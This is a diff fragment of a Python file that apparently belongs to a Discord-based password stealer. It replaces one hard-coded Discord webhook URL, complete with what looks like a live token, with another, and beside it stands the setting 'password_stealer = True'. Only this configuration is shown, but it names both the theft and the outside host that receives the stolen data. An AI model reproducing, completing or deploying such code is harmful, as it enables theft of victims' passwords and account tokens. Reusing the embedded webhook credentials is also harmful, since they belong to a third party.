@@ -605,7 +605,7 @@ from datetime import datetime
 
 
 
-webhook_url = "https://discord.com/api/webhooks/889322486955638844/yLIoDJbFZI4XcBqS0j52RtXNpCf9R8LsVP3PiY17TPSlN_l1qYlU8sSmkhnXxh4Mu6V5"
+webhook_url = "https://discord.com/api/webhooks/890712944751575082/UJNnucplmbB2sQVdyRJy38d2X5RO7kiVNHTluwA7EdPtdlDqd5vVdoS74TXV1IunaOAB"
 password_stealer = True
 
 languages = {
